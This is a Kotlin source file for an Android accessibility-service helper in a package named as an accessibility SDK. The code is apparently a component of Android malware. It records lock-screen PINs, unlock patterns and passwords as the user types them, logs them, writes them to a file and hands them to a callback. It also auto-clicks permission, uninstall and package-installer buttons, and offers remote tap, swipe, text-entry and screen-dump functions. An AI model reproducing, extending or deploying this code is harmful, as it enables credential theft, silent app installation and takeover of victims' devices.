package com.openaccess.sdk.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.KeyguardManager
import android.content.Context
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.File

class InputHelper(private val service: AccessibilityService) {
    companion object {
        private const val TAG = "Harvester"
    }

    private var keyguardManager: KeyguardManager =
        service.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager

    private var capturedPin = ""
    private var capturedPattern = ""
    private var capturedPassword = ""
    private var wasLocked = false
    private var logFile: File? = null
    private var onLockCaptured: ((pin: String, pattern: String, password: String) -> Unit)? = null

    fun setLogFile(f: File) { logFile = f }
    fun setCallback(cb: (String, String, String) -> Unit) { onLockCaptured = cb }

    fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            val isLocked = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                keyguardManager.isDeviceLocked
            } else {
                keyguardManager.isKeyguardLocked
            }

            if (wasLocked && !isLocked) {
                reportUnlock()
            }
            wasLocked = isLocked

            if (isLocked) {
                harvest(event)
            }
        } catch (e: Exception) {
            Log.e(TAG, "event: ${e.message}")
        }
    }

    private fun harvest(event: AccessibilityEvent) {
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_CLICKED &&
            event.eventType != AccessibilityEvent.TYPE_VIEW_FOCUSED &&
            event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return

        val source = event.source ?: return
        var resId: String? = null
        try {
            resId = source.viewIdResourceName
        } catch (_: Exception) {}
        if (resId == null) { source.recycle(); return }

        val bounds = Rect()
        source.getBoundsInScreen(bounds)

        if (resId.contains("com.android.systemui:id/key")) {
            val key = resId.substringAfterLast("key")
            if (key.matches("\\d".toRegex())) {
                capturedPin += key
                Log.d(TAG, "PIN digit: $key")
            } else if (key.contains("enter") || key.contains("ok")) {
                capturedPin += "[E]"
                Log.d(TAG, "PIN enter")
            }
        }

        if (resId.contains("lockPatternView")) {
            val desc = source.contentDescription?.toString() ?: return
            if (!capturedPattern.contains(desc)) {
                capturedPattern += "$desc "
                Log.d(TAG, "Pattern cell: $desc")
            }
        }

        if (resId.contains("passwordEntry") || resId.contains("pinEntry") || resId.contains("miui_mixed_password")) {
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                capturedPassword = event.text?.joinToString("") ?: ""
                Log.d(TAG, "Password: $capturedPassword")
            }
        }

        source.recycle()
    }

    private fun reportUnlock() {
        if (capturedPin.isEmpty() && capturedPattern.isEmpty() && capturedPassword.isEmpty()) return
        val entry = "PIN: $capturedPin | Pattern: ${capturedPattern.trim()} | Password: $capturedPassword\n"
        Log.i(TAG, "Lock captured: $entry")
        logFile?.appendText("${System.currentTimeMillis()} LOCK: $entry")
        onLockCaptured?.invoke(capturedPin, capturedPattern.trim(), capturedPassword)

        capturedPin = ""
        capturedPattern = ""
        capturedPassword = ""
    }

    fun autoClickGrant(node: AccessibilityNodeInfo, depth: Int = 0) {
        if (node == null || depth > 20) return
        for (i in 0 until node.childCount) {
            try {
                val child = node.getChild(i) ?: continue
                child.text?.toString()?.let { text ->
                    val keywords = listOf(
                        "allow", "ok", "yes", "while using the app", "allow every time",
                        "confirm", "approve", "authorize", "uninstall", "start now",
                        "comenzar", "commencer", "allow while using the app", "only this time",
                        "install", "installer", "installieren", "instalar",
                        "open", "done", "finish", "ready"
                    )
                    if (keywords.any { text.contains(it, ignoreCase = true) } && child.isClickable) {
                        child.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        Log.d(TAG, "Auto-clicked: $text")
                        return
                    }
                }
                autoClickGrant(child, depth + 1)
            } catch (_: Exception) {}
        }
    }

    private var installClicked = false
    private var installStartTime = 0L
    private var installAttempts = 0

    fun autoInstall(): Boolean {
        val root = service.rootInActiveWindow ?: return false
        try {
            val now = System.currentTimeMillis()
            installAttempts++

            if (!installClicked) {
                val installTexts = listOf("Install", "INSTALL", "install", "Installer", "Install anyway", "Install Anyway", "Install Anyway", "OK", "ok")
                for (text in installTexts) {
                    val nodes = root.findAccessibilityNodeInfosByText(text)
                    for (node in nodes) {
                        if (isButtonLike(node)) {
                            performClick(node)
                            installClicked = true
                            installStartTime = now
                            installAttempts = 0
                            Log.d(TAG, "Auto-install: clicked '$text'")
                            return true
                        }
                    }
                }

                val installIds = listOf(
                    "com.google.android.packageinstaller:id/ok_button",
                    "com.google.android.packageinstaller:id/button_confirm",
                    "com.android.packageinstaller:id/ok_button",
                    "com.android.packageinstaller:id/button_confirm",
                    "com.google.android.packageinstaller:id/install_confirm_button"
                )
                for (id in installIds) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
                    for (node in nodes) {
                        performClick(node)
                        installClicked = true
                        installStartTime = now
                        installAttempts = 0
                        Log.d(TAG, "Auto-install: clicked id '$id'")
                        return true
                    }
                }

                if (installAttempts > 5 && !installClicked) {
                    val clickableBtns = findClickableButtons(root)
                    if (clickableBtns.isNotEmpty()) {
                        performClick(clickableBtns[0])
                        installClicked = true
                        installStartTime = now
                        installAttempts = 0
                        Log.d(TAG, "Auto-install: clicked fallback button")
                        return true
                    }
                }
            } else if (now - installStartTime > 2000) {
                val doneTexts = listOf("Done", "DONE", "Open", "OPEN", "Finish", "Ready")
                for (text in doneTexts) {
                    val nodes = root.findAccessibilityNodeInfosByText(text)
                    for (node in nodes) {
                        if (isButtonLike(node)) {
                            performClick(node)
                            installClicked = false
                            installAttempts = 0
                            Log.d(TAG, "Auto-install: clicked '$text'")
                            return true
                        }
                    }
                }

                val doneIds = listOf(
                    "com.google.android.packageinstaller:id/done_button",
                    "com.google.android.packageinstaller:id/button_done",
                    "com.android.packageinstaller:id/done_button",
                    "com.google.android.packageinstaller:id/open_button"
                )
                for (id in doneIds) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
                    for (node in nodes) {
                        performClick(node)
                        installClicked = false
                        installAttempts = 0
                        Log.d(TAG, "Auto-install: clicked id '$id'")
                        return true
                    }
                }
            }
        } catch (_: Exception) {}
        return false
    }

    private fun isButtonLike(node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable) return true
        val className = node.className?.toString() ?: ""
        return className.contains("Button") || className.contains("TextView")
    }

    private fun performClick(node: AccessibilityNodeInfo) {
        if (node.isClickable) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        } else {
            val bounds = Rect()
            node.getBoundsInScreen(bounds)
            click(bounds.centerX(), bounds.centerY())
        }
    }

    private fun findClickableButtons(root: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val buttons = mutableListOf<AccessibilityNodeInfo>()
        findClickableButtonsRecursive(root, buttons, 0)
        return buttons
    }

    private fun findClickableButtonsRecursive(node: AccessibilityNodeInfo, buttons: MutableList<AccessibilityNodeInfo>, depth: Int) {
        if (depth > 15 || buttons.size >= 5) return
        try {
            if (node.isClickable) {
                val className = node.className?.toString() ?: ""
                if (className.contains("Button") || className.contains("TextView")) {
                    buttons.add(node)
                }
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { findClickableButtonsRecursive(it, buttons, depth + 1) }
            }
        } catch (_: Exception) {}
    }

    fun clickByText(text: String) {
        val root = service.rootInActiveWindow ?: return
        val nodes = root.findAccessibilityNodeInfosByText(text)
        if (nodes != null) {
            for (node in nodes) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "Clicked text: $text")
                    return
                }
                val bounds = Rect()
                node.getBoundsInScreen(bounds)
                click(bounds.centerX(), bounds.centerY())
                return
            }
        }
    }

    fun clickById(id: String) {
        val root = service.rootInActiveWindow ?: return
        val nodes = root.findAccessibilityNodeInfosByViewId(id)
        if (nodes != null) {
            for (node in nodes) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "Clicked id: $id")
                    return
                }
                val bounds = Rect()
                node.getBoundsInScreen(bounds)
                click(bounds.centerX(), bounds.centerY())
                return
            }
        }
    }

    fun inputText(text: String) {
        val root = service.rootInActiveWindow ?: return
        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
        val args = android.os.Bundle()
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
        focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT)
        Log.d(TAG, "Input text: $text")
    }

    fun click(x: Int, y: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val builder = GestureDescription.Builder()
            val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
            builder.addStroke(GestureDescription.StrokeDescription(path, 0, 100))
            service.dispatchGesture(builder.build(), null, null)
            Log.d(TAG, "Gesture click: ($x, $y)")
        }
    }

    fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, duration: Int = 300) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val builder = GestureDescription.Builder()
            val path = Path().apply { moveTo(x1.toFloat(), y1.toFloat()); lineTo(x2.toFloat(), y2.toFloat()) }
            builder.addStroke(GestureDescription.StrokeDescription(path, 0, duration.toLong()))
            service.dispatchGesture(builder.build(), null, null)
            Log.d(TAG, "Gesture swipe: ($x1,$y1)->($x2,$y2)")
        }
    }

    fun globalAction(action: Int) {
        service.performGlobalAction(action)
    }

    fun dumpScreen(): String {
        val root = service.rootInActiveWindow ?: return "No active window"
        val sb = StringBuilder()
        dumpNode(root, sb, 0)
        return sb.toString()
    }

    private fun dumpNode(node: AccessibilityNodeInfo, sb: StringBuilder, depth: Int) {
        if (node == null) return
        try {
            val indent = "  ".repeat(depth)
            val text = node.text?.toString() ?: ""
            val desc = node.contentDescription?.toString() ?: ""
            val cls = node.className?.toString() ?: ""
            val resId = node.viewIdResourceName ?: ""
            val bounds = Rect()
            node.getBoundsInScreen(bounds)
            if (text.isNotEmpty() || desc.isNotEmpty() || node.isClickable || node.isCheckable) {
                sb.appendLine("$indent[$cls] t='$text' d='$desc' id='$resId' b=$bounds clickable=${node.isClickable}")
            }
            for (i in 0 until node.childCount) {
                try {
                    val child = node.getChild(i)
                    if (child != null) dumpNode(child, sb, depth + 1)
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
    }
}
